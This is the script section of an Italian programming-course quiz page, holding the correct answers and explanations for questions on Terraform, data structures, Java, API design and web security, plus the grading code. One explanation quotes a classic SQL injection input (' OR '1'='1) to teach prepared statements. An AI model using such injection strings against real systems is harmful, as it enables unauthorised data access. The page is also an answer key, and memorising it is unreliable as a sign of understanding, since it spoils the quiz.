                correct: 'c',
                correctText: '✅ Corretto! Senza state locking, entrambi gli apply leggono lo stesso state iniziale, fanno le loro modifiche al cloud, poi scrivono lo state finale. Il secondo a scrivere sovrascrive lo state del primo, "dimenticando" le risorse create dal primo. Risultato: risorse "orphaned" nel cloud (esistono ma Terraform non le conosce) o state corrotto. Per questo si usa DynamoDB (AWS) o altri sistemi per state locking.',
                incorrectText: {
                    a: '❌ Sbagliato. Terraform non serializza automaticamente nulla. È responsabilità dell\'utente/team configurare state locking con DynamoDB, Consul, o Terraform Cloud.',
                    b: '❌ Sbagliato. Senza locking, non c\'è nessun errore di conflitto. Entrambi gli apply procedono "felicemente" e il problema emerge dopo, quando lo state è già corrotto.',
                    d: '❌ Sbagliato. Le risorse non vengono duplicate automaticamente. Il problema è nello STATE, non nelle risorse cloud. Una delle modifiche viene "persa" dallo state tracking.'
                }
            },
            // Modulo 7: Coding Challenges
            q31: {
                correct: 'b',
                correctText: '✅ Corretto! Con una Singly Linked List, per rimuovere un nodo devi conoscere il nodo precedente, il che richiede O(n) traversal. Con una Doubly Linked List, ogni nodo ha un puntatore al precedente (prev), quindi la rimozione è O(1): basta fare node.prev.next = node.next e node.next.prev = node.prev. Questo è cruciale per mantenere O(1) sia per get() che per put().',
                incorrectText: {
                    a: '❌ Sbagliato. L\'iterazione bidirezionale non è necessaria per LRU Cache. Ci serve solo aggiungere in testa e rimuovere dalla coda (o rimuovere un nodo arbitrario quando viene accesso).',
                    c: '❌ Sbagliato. Una Doubly Linked List usa PIÙ spazio (un puntatore extra per nodo), non meno. Il trade-off è spazio per tempo.',
                    d: '❌ Sbagliato. Java supporta implementazioni di liste singly linked. LinkedList di Java è in realtà una doubly linked list, ma nulla impedisce di implementarne una singly.'
                }
            },
            q32: {
                correct: 'c',
                correctText: '✅ Corretto! LinkedHashMap in Java con accessOrder=true mantiene automaticamente l\'ordine di accesso e supporta removeEldestEntry() per l\'eviction automatica. Internamente usa una struttura simile alla nostra (HashMap + doubly linked list), quindi tutte le operazioni sono O(1). Questa è effettivamente la soluzione "production-ready" in Java.',
                incorrectText: {
                    a: '❌ Sbagliato. LinkedHashMap ha O(1) per get e put, non O(n). Internamente combina HashMap (O(1) lookup) con linked list (O(1) reordering).',
                    b: '❌ Sbagliato. L\'eviction in LinkedHashMap è O(1): il nodo più vecchio è sempre in testa alla lista interna, basta rimuoverlo.',
                    d: '❌ Sbagliato. LinkedHashMap non usa strutture logaritmiche come alberi. È O(1) amortizzato come una normale HashMap.'
                }
            },
            q33: {
                correct: 'a',
                correctText: '✅ Corretto! Con solo un tipo di parentesi, non serve uno stack completo. Basta un contatore: incrementa per \'(\', decrementa per \')\'. Se il contatore diventa negativo, la stringa è invalida (più chiuse che aperte). Alla fine, il contatore deve essere 0. Questo è O(1) space. Con parentesi multiple (()[]{}) serve lo stack perché devi matchare il TIPO corretto.',
                incorrectText: {
                    b: '❌ Sbagliato. Lo stack è necessario solo per parentesi multiple dove devi verificare che la chiusura corrisponda all\'apertura giusta. Con un solo tipo, il contatore basta.',
                    c: '❌ Sbagliato. Non esiste una soluzione O(log n) space per questo problema. È O(1) con contatore o O(n) con stack.',
                    d: '❌ Sbagliato. Non serve confrontare ogni coppia. Basta un singolo passaggio O(n) time con O(1) space (contatore).'
                }
            },
            q34: {
                correct: 'd',
                correctText: '✅ Corretto! Se l\'input è già ordinato per start time, il sorting O(n log n) non è necessario. Il merge richiede solo un singolo passaggio lineare O(n): scorri gli intervalli, e per ognuno decidi se estendere l\'ultimo o aggiungerne uno nuovo. Questa è un\'ottimizzazione importante da menzionare al colloquio: chiedi sempre se l\'input ha proprietà speciali!',
                incorrectText: {
                    a: '❌ Sbagliato. Se sai che l\'input è ordinato, non devi ri-verificarlo. Puoi procedere direttamente con il merge O(n). Verificare se è ordinato sarebbe comunque O(n), non O(n log n).',
                    b: '❌ Sbagliato. Non serve confrontare ogni intervallo con tutti gli altri. Con input ordinato, gli intervalli sovrapponibili sono sempre adiacenti.',
                    c: '❌ Sbagliato. Il problema non diventa O(1). Devi comunque processare tutti gli n intervalli per produrre il risultato. È O(n), non O(1).'
                }
            },
            q35: {
                correct: 'b',
                correctText: '✅ Corretto! Il problema principale è l\'atomicità: get() e put() devono aggiornare sia la HashMap che la lista in modo atomico. Se un thread fa get() mentre un altro fa put() con eviction, potresti avere inconsistenze (es. nodo nella HashMap ma non nella lista, o viceversa). ConcurrentHashMap da solo non basta perché non protegge le operazioni sulla lista. Serve sincronizzazione che copra entrambe le strutture.',
                incorrectText: {
                    a: '❌ Sbagliato. ConcurrentHashMap protegge solo la HashMap. Le operazioni sulla linked list e l\'atomicità tra HashMap e lista non sono garantite.',
                    c: '❌ Sbagliato. Tecnicamente puoi condividere la lista, ma devi sincronizzare gli accessi. Il problema è l\'atomicità delle operazioni composite, non la condivisione in sé.',
                    d: '❌ Sbagliato. Le strutture dati standard in Java (HashMap, LinkedList, etc.) NON sono thread-safe. Solo le classi in java.util.concurrent lo sono.'
                }
            },
            // Modulo 8: Paradigmi di Programmazione
            q36: {
                correct: 'c',
                correctText: '✅ Corretto! add(a, b) è pura: dato gli stessi a e b, ritorna sempre lo stesso risultato (a+b) e non ha side effects. Le altre: count() modifica stato esterno (counter++), random() non è deterministica (ritorna valori diversi), log() ha side effect (scrive su stdout).',
                incorrectText: {
                    a: '❌ Sbagliato. counter++ è un side effect: modifica stato esterno alla funzione. Inoltre, chiamate successive ritornano valori diversi anche senza argomenti.',
                    b: '❌ Sbagliato. Math.random() non è deterministica: ogni chiamata ritorna un valore diverso. Una funzione pura deve ritornare lo stesso output per lo stesso input.',
                    d: '❌ Sbagliato. System.out.println() è un side effect: modifica il "mondo esterno" (scrive su stdout). Inoltre ritorna void, non trasforma input in output.'
                }
            },
            q37: {
                correct: 'b',
                correctText: '✅ Corretto! Le operazioni I/O-bound (network, disk) NON beneficiano di parallel streams perché: 1) Il thread aspetta la risposta, non usa CPU. 2) Il ForkJoinPool comune è progettato per CPU-bound tasks. 3) Operazioni bloccanti possono "affamare" altri parallel streams. Per I/O parallelo, usa CompletableFuture con un executor dedicato o reactive streams.',
                incorrectText: {
                    a: '❌ Sbagliato. Operazioni CPU-intensive come isPrime sono il caso d\'uso IDEALE per parallel streams: dividono il lavoro di calcolo tra i core.',
                    c: '❌ Sbagliato. complexCalculation è CPU-bound, quindi beneficia del parallelismo. Ogni core può eseguire calcoli indipendenti.',
                    d: '❌ Sbagliato. reduce può essere parallelizzato se l\'operazione è associativa (come la somma). Java partiziona i dati, riduce in parallelo, poi combina i risultati.'
                }
            },
            q38: {
                correct: 'd',
                correctText: '✅ Corretto! orElse() valuta SEMPRE l\'argomento, anche se Optional ha un valore. Se Optional contiene "Alice", expensiveComputation() viene comunque eseguita (poi ignorata). Questo è un bug di performance silenzioso. Usa orElseGet(() -> expensiveComputation()) per lazy evaluation: il supplier viene chiamato solo se Optional è vuoto.',
                incorrectText: {
                    a: '❌ Sbagliato. orElse("default") è corretto: "default" è una costante, non c\'è calcolo sprecato.',
                    b: '❌ Sbagliato. map() è lazy e corretto: trasforma il valore solo se presente, altrimenti propaga Optional.empty().',
                    c: '❌ Sbagliato. orElseThrow() è corretto per casi dove l\'assenza è un errore. Lancia eccezione esplicitamente, non è un bug silenzioso.'
                }
            },
            q39: {
                correct: 'a',
                correctText: '✅ Corretto! La laziness permette: 1) Short-circuit: findFirst() si ferma al primo match senza processare tutto. 2) Loop fusion: filter().map() può essere fuso in un singolo passaggio invece di creare collezioni intermedie. 3) Nessun lavoro sprecato: se non c\'è operazione terminale, nulla viene eseguito. Questo è cruciale per performance su dataset grandi.',
                incorrectText: {
                    b: '❌ Sbagliato. La laziness non riguarda la thread-safety. Gli Stream possono avere race conditions se usati impropriamente (es. side effects in forEach parallelo).',
                    c: '❌ Sbagliato. La laziness è una scelta di design per performance, non per compatibilità. Era una feature nuova in Java 8.',
                    d: '❌ Sbagliato. Java può eseguire metodi void. La laziness è intenzionale per ottimizzazione, non una limitazione del linguaggio.'
                }
            },
            q40: {
                correct: 'c',
                correctText: '✅ Corretto! Se un oggetto è immutabile, non può cambiare stato dopo la creazione. Questo significa che: 1) Non servono lock/synchronized per leggere. 2) Non esistono race conditions (nessuno può modificare mentre un altro legge). 3) Puoi condividere liberamente tra thread. Questo semplifica enormemente la programmazione concorrente, eliminando intere categorie di bug.',
                incorrectText: {
                    a: '❌ Sbagliato. L\'immutabilità può aumentare l\'uso di memoria (ogni "modifica" crea un nuovo oggetto). La condivisione è safe ma non necessariamente riduce memoria.',
                    b: '❌ Sbagliato. Il GC non lavora "più efficientemente" con oggetti immutabili. Anzi, creare molti oggetti può aumentare la pressione sul GC.',
                    d: '❌ Sbagliato. L\'immutabilità non rende automaticamente il codice più veloce. Il vantaggio è la sicurezza thread-safe, non la raw performance.'
                }
            },
            // Modulo 9: API Design
            q41: {
                correct: 'b',
                correctText: '✅ Corretto! POST non è idempotente per design: ogni richiesta crea una nuova risorsa. Senza idempotency key, il server non ha modo di sapere che la seconda richiesta è un retry, quindi crea due ordini. Per questo si usa X-Idempotency-Key: il client genera un ID unico, e il server lo usa per riconoscere i retry e ritornare il risultato cached invece di processare di nuovo.',
                incorrectText: {
                    a: '❌ Sbagliato. Il server non può rilevare automaticamente i duplicati senza un meccanismo esplicito (idempotency key). Due richieste identiche sono indistinguibili.',
                    c: '❌ Sbagliato. 409 Conflict si usa per violazioni di constraint (es. email già esistente), non per retry detection. Senza idempotency key, non c\'è conflitto - sono due creazioni valide.',
                    d: '❌ Sbagliato. HTTP non garantisce at-most-once. Il protocollo è stateless - ogni richiesta è indipendente. La semantica di delivery dipende dall\'applicazione.'
                }
            },
            q42: {
                correct: 'c',
                correctText: '✅ Corretto! Per feed social (timeline), cursor-based pagination è ideale perché: 1) I dati cambiano frequentemente (nuovi post) - offset causerebbe duplicati o post mancanti. 2) Non serve "vai a pagina 57" - lo scroll è sempre sequenziale. 3) Performance: il cursor (tipicamente timestamp + ID) usa indici efficientemente, mentre OFFSET 10000 deve scorrere 10000 righe.',
                incorrectText: {
                    a: '❌ Sbagliato. Offset-based ha problemi con dati in movimento: se un nuovo post viene aggiunto mentre scrolli, vedrai duplicati o salterai post.',
                    b: '❌ Sbagliato. Un feed social può avere milioni di post. Caricare tutto è impossibile per memoria e bandwidth. La pagination è obbligatoria.',
                    d: '❌ Sbagliato. Un feed deve essere ordinato cronologicamente (o per relevance). Random sampling renderebbe l\'UX caotica e inutilizzabile.'
                }
            },
            q43: {
                correct: 'a',
                correctText: '✅ Corretto! 403 Forbidden: l\'utente È autenticato (sappiamo chi è) ma NON È autorizzato ad accedere a quella specifica risorsa. 401 Unauthorized significa "non autenticato" (nome fuorviante nello standard HTTP). La distinzione è importante per il client: 401 → mostra login, 403 → mostra "accesso negato".',
                incorrectText: {
                    b: '❌ Sbagliato. 401 Unauthorized si usa quando l\'utente NON è autenticato (token mancante/invalido). Qui l\'utente è autenticato, ma non ha i permessi.',
                    c: '❌ Sbagliato. 404 indica che la risorsa non esiste. Usarlo per nascondere l\'esistenza può avere senso per sicurezza (security through obscurity), ma non è semanticamente corretto.',
                    d: '❌ Sbagliato. 400 Bad Request indica problemi con la richiesta stessa (JSON malformato, validation error). L\'autorizzazione non è un problema di formato richiesta.'
                }
            },
            q44: {
                correct: 'd',
                correctText: '✅ Corretto! HTTP cache usa l\'URL come cache key. In REST, GET /users/123 e GET /users/456 sono URL diverse → cache separate. In GraphQL, TUTTE le query vanno a POST /graphql con query nel body. Stesso URL per query diverse = impossibile cachare a livello HTTP/CDN. Soluzioni: persisted queries (hash → query), GET con query param, o caching application-level.',
                incorrectText: {
                    a: '❌ Sbagliato. GraphQL usa JSON, non formato binario. Il formato non è il problema del caching.',
                    b: '❌ Sbagliato. Le response possono essere deterministiche. Il problema è che l\'HTTP cache non sa distinguere query diverse perché vanno tutte allo stesso endpoint.',
                    c: '❌ Sbagliato. GraphQL supporta tutti gli HTTP headers. Il problema è il metodo (POST) e l\'endpoint unico, non gli headers.'
                }
            },
            q45: {
                correct: 'b',
                correctText: '✅ Corretto! Per comunicazione interna ad alta frequenza, gRPC eccelle: 1) Protocol Buffers sono 3-10x più piccoli di JSON. 2) HTTP/2 multiplexing: una connessione, molte richieste parallele senza head-of-line blocking. 3) Code generation: client/server strongly typed, meno errori. 4) Streaming nativo per scenari real-time. REST è più semplice ma meno efficiente; GraphQL è per frontend flexibility, non performance backend.',
                incorrectText: {
                    a: '❌ Sbagliato. Per servizi interni, la facilità di debug con curl è meno importante della performance. gRPC ha tools (grpcurl, Evans) e observability ottima.',
                    c: '❌ Sbagliato. GraphQL risolve problemi di frontend (over/under-fetching). Tra microservizi, le interfacce sono definite chiaramente - la flessibilità GraphQL aggiunge overhead senza beneficio.',
                    d: '❌ Sbagliato. WebSocket è per comunicazione bidirezionale push-based (chat, notifiche). Per request-response ad alta frequenza, gRPC con HTTP/2 è più appropriato e strutturato.'
                }
            },
            // Modulo 10: Security
            q46: {
                correct: 'c',
                correctText: '✅ Corretto! La query diventa: SELECT * FROM users WHERE id = \'1\' OR \'1\'=\'1\'. Poiché \'1\'=\'1\' è sempre vero, la condizione WHERE è sempre vera per OGNI riga. Risultato: ritorna TUTTI gli utenti. Questo è un classico bypass di autenticazione. Con prepared statements, l\'input verrebbe trattato come stringa letterale, non come codice SQL.',
                incorrectText: {
                    a: '❌ Sbagliato. La query è sintatticamente valida. Gli apici sono bilanciati e l\'OR è SQL valido.',
                    b: '❌ Sbagliato. Il database non cerca un ID con quel valore letterale. Interpreta l\'input come codice SQL, aggiungendo una condizione OR sempre vera.',
                    d: '❌ Sbagliato. I database non hanno protezione automatica contro SQL injection. È responsabilità dell\'applicazione usare prepared statements.'
                }
            },
            q47: {
                correct: 'b',
                correctText: '✅ Corretto! JWT per design sono stateless - il server non tiene traccia dei token emessi. Per revocare un token specifico, devi implementare una blacklist (in Redis o DB) dei token revocati. Ad ogni richiesta, oltre a verificare la firma, controlli se il token è in blacklist. Trade-off: perdi parte della "statelessness", ma è l\'unico modo per revoca immediata.',
                incorrectText: {
                    a: '❌ Sbagliato. Cambiare la secret key invalida TUTTI i token, non solo quello rubato. Tutti gli utenti dovrebbero riautenticarsi.',
                    c: '❌ Sbagliato. Aspettare la scadenza può significare ore o giorni di accesso non autorizzato. Inaccettabile per security.',
                    d: '❌ Sbagliato. La firma garantisce che il token non sia stato MODIFICATO, non che non sia stato COPIATO. Se l\'attacker ha il token, può usarlo.'
                }
            },
            q48: {
                correct: 'a',
                correctText: '✅ Corretto! La difesa principale contro XSS è l\'output encoding: quando renderizzi la bio, escape i caratteri speciali HTML (<, >, &, \", \') in entità HTML (&lt;, &gt;, etc.). Così <script> diventa &lt;script&gt; e il browser lo mostra come testo, non lo esegue. Input validation è un layer aggiuntivo, ma l\'output encoding è la difesa primaria.',
                incorrectText: {
                    b: '❌ Sbagliato. Rifiutare caratteri speciali è troppo restrittivo (gli utenti vogliono usare <3, "citazioni", etc.) e non è la difesa giusta. L\'output encoding permette qualsiasi input ma lo rende sicuro.',
                    c: '❌ Sbagliato. HTTPS cifra il trasporto ma non previene XSS. Lo script malevolo arriva comunque al browser, solo cifrato durante il trasporto.',
                    d: '❌ Sbagliato. Rate limiting previene brute force e DoS, non XSS. L\'attacker deve inserire lo script una volta sola.'
                }
            },
            q49: {
                correct: 'd',
                correctText: '✅ Corretto! CSRF funziona perché i browser inviano automaticamente i cookie con ogni richiesta allo stesso dominio. L\'attacker può far fare al browser della vittima una richiesta a bank.com, e i cookie vengono inclusi automaticamente. Ma Authorization header NON è automatico: il JavaScript deve esplicitamente aggiungerlo. Un sito malevolo non può aggiungere header a richieste cross-origin (CORS lo impedisce).',
                incorrectText: {
                    a: '❌ Sbagliato. CSRF non è sempre necessario. È necessario quando usi cookie per l\'autenticazione. Con token in header, CSRF non è un rischio.',
                    b: '❌ Sbagliato. CSRF non ruba token - fa eseguire azioni usando i cookie della vittima. JWT in header non è vulnerabile a CSRF (ma può essere vulnerabile a XSS se in localStorage).',
                    c: '❌ Sbagliato. Anche da browser, se usi Authorization header invece di cookie, CSRF non è un rischio. Il browser non aggiunge automaticamente l\'header.'
                }
            },
            q50: {
                correct: 'c',
                correctText: '✅ Corretto! BCrypt, Argon2, e scrypt sono algoritmi di "adaptive hashing" progettati per password. Sono intenzionalmente LENTI (work factor configurabile) per rendere il brute force impraticabile. Includono salt automatico. SHA-256 è troppo veloce (miliardi di tentativi/secondo con GPU). MD5 è completamente broken. AES è per encryption (reversibile), non hashing (one-way).',
                incorrectText: {
                    a: '❌ Sbagliato. SHA-256 è troppo veloce per password hashing. Con hardware moderno, un attacker può provare miliardi di combinazioni al secondo. È ok per checksum, non per password.',
                    b: '❌ Sbagliato. MD5 è completamente broken - collision attacks pratici, rainbow tables disponibili. MAI usare MD5 per nulla di security-related.',
                    d: '❌ Sbagliato. AES è encryption simmetrica: reversibile con la chiave. Per le password serve hashing one-way: non devi MAI poter recuperare la password originale.'
                }
            }
        };

        function checkAnswer(questionId) {
            const questionEl = document.querySelector(`[data-correct]#feedback-${questionId}`)?.closest('.quiz-question')
                || document.querySelector(`.quiz-question:has(#feedback-${questionId})`);

            if (!questionEl) return;

            const correctAnswer = questionEl.dataset.correct;
            const selectedOption = questionEl.querySelector(`input[name="${questionId}"]:checked`);

            if (!selectedOption) {
                alert('Seleziona una risposta prima di verificare!');
                return;
            }

            const selectedValue = selectedOption.value;
            const feedbackEl = document.getElementById(`feedback-${questionId}`);
            const allOptions = questionEl.querySelectorAll('.quiz-option');

            // Reset previous states
            allOptions.forEach(opt => {
                opt.classList.remove('correct', 'incorrect');
            });

            // Mark correct and incorrect
            allOptions.forEach(opt => {
                const optValue = opt.dataset.value;
                if (optValue === correctAnswer) {
                    opt.classList.add('correct');
                } else if (optValue === selectedValue) {
                    opt.classList.add('incorrect');
                }
            });

            // Show feedback
            const explanation = explanations[questionId];
            if (selectedValue === correctAnswer) {
                feedbackEl.className = 'feedback correct';
                feedbackEl.innerHTML = `<strong>Esatto!</strong>${explanation.correctText}`;
            } else {
                feedbackEl.className = 'feedback incorrect';
                feedbackEl.innerHTML = `<strong>Risposta errata</strong>${explanation.incorrectText[selectedValue]}<br><br><em>La risposta corretta era l'opzione ${correctAnswer.toUpperCase()}:</em> ${explanation.correctText.replace('✅ Corretto! ', '')}`;
            }

            // Disable further changes
            questionEl.querySelectorAll('input').forEach(input => input.disabled = true);
            questionEl.querySelector('.check-btn').disabled = true;
        }

        // Smooth scrolling for sidebar links
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', function(e) {
                const href = this.getAttribute('href');
                if (href.startsWith('#')) {
                    e.preventDefault();
                    const target = document.querySelector(href);
                    if (target) {
                        target.scrollIntoView({ behavior: 'smooth' });
                    }

                    // Update active state
                    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });

        // Update active nav on scroll
        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('section[id], header[id]');
            let current = '';

            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (scrollY >= sectionTop - 100) {
                    current = section.getAttribute('id');
                }
            });

            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${current}`) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
